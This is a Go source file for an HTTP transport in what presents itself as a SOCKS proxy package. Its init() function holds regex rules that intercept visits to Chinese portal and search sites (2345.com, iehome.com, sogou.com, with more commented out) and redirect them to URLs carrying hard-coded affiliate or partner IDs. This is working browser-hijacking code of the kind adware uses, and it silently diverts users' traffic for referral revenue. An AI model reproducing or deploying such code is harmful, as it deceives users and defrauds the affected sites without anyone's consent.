package socks

import (
	"github.com/ssoor/socks/compiler"
	"io/ioutil"
	"log"
	"net"
	"net/http"
	"net/url"
	"os"
	"strings"
)

type HTTPTransport struct {
	http.Transport

	tranpoort_local http.Transport
}

func NewHTTPTransport(forward Dialer) *HTTPTransport {

	transport := &HTTPTransport{
		Transport: http.Transport{
			Dial: func(network, addr string) (net.Conn, error) {
				return forward.Dial(network, addr)
			},
		},
		tranpoort_local: http.Transport{
			Dial: func(network, addr string) (net.Conn, error) {
				return Direct.Dial(network, addr)
			},
		},
	}

	return transport
}

func createRedirectResponse(url string, req *http.Request) (resp *http.Response) {

	resp = &http.Response{
		StatusCode: http.StatusFound,
		ProtoMajor: 1,
		ProtoMinor: 1,
		Request:    req,
		Header: http.Header{
			"Location": []string{url},
		},
		ContentLength:    0,
		TransferEncoding: nil,
		Body:             ioutil.NopCloser(strings.NewReader("")),
		Close:            true,
	}

	return
}

var rules compiler.SCompiler

func init() {

	rules.Add("www.iehome.com", "s@^(http[s]?)://www.iehome.com/*/\\?.*$@http://www.2345.com/?kc000858p@i") //^(http[s]?)://[^/]*[/]*/

	//rules.Add("hao.360.cn", "s@^(http[s]?)://hao.360.cn/*/\\?.*$@$1://hao.360.cn/?src=lm&ls=n6e7c24959a@i") //kc000880p

	rules.Add("www.2345.com", "s@^(http[s]?)://www.2345.com/*/\\?.*$@$1://www.2345.com/?kc000858p@i") //kc000880p

	//	rules.Add("www.duba.com", "s@^(http[s]?)://www.duba.com/*/\\?.*$@$1://www.duba.com/?un_376755_70@i")

	//rules.Add("123.sogou.com", "s@^(http[s]?)://123.sogou.com/*/\\?.*$@$1://123.sogou.com/?71029-7674@i")
	//rules.Add("www.sogou.com", "s@^(http[s]?)://www.sogou.com/*/sie\\?(?:(.*)&)?(?:hdq=[^&]*)(.*)$@$1://www.sogou.com/sie?$2&hdq=Af71029-7674$3@i")

	//rules.Add("www.hao123.com", "s@^(http[s]?)://www.hao123.com/*/\\?.*$@$1://www.hao123.com/?tn=13087099_4_hao_pg@i")
	//rules.Add("www.baidu.com", "s@^(http[s]?)://www.baidu.com/*/s\\?(?:(.*)&)?(?:tn=[^&]*)(.*)$@$1://www.baidu.com/s?$2&tn=13087099_4_hao_pg$3@i")

	rules.Add("www.sogou.com", "s@^(http[s]?)://www.sogou.com/*/index\\.(?:php|html|htm)\\?.*$@$1://www.sogou.com/index.htm?pid=sogou-netb-3be0214185d6177a-4012@i")
	rules.Add("www.sogou.com", "s@^(http[s]?)://www.sogou.com/*/sogou\\?(?:(.*)&)?(?:pid=[^&]*)(.*)$@$1://www.sogou.com/sogou?$2&pid=sogou-netb-3be0214185d6177a-4012$3@i")

}

func (this *HTTPTransport) RoundTrip(req *http.Request) (resp *http.Response, err error) {

	srcurl := req.URL.String()

	tranpoortType := "local"
	tranpoort := this.tranpoort_local

	log.SetOutput(os.Stdout)

	if dsturl, err := rules.Replace(req.Host, srcurl); err == nil {

		parseurl, err := url.Parse(dsturl)

		if err == nil && false == strings.EqualFold(dsturl, srcurl) {
			resp = createRedirectResponse(dsturl, req)
			log.Printf("reset: %s(%s)\n", dsturl, srcurl)
			return resp, nil
		}

		req.URL = parseurl
		tranpoortType = "remote"
		tranpoort = this.Transport
	}

	//tranpoort = this.Transport
	resp, err = tranpoort.RoundTrip(req)

	if err != nil {
		log.Printf("err: %s\n", err)
		return
	}

	if resp_type := resp.Header.Get("Content-Type"); strings.Contains(strings.ToLower(resp_type), "text/html") {
		log.Printf("open url(%s): %s\n", tranpoortType, resp.Request.URL.String())
	}

	return
}
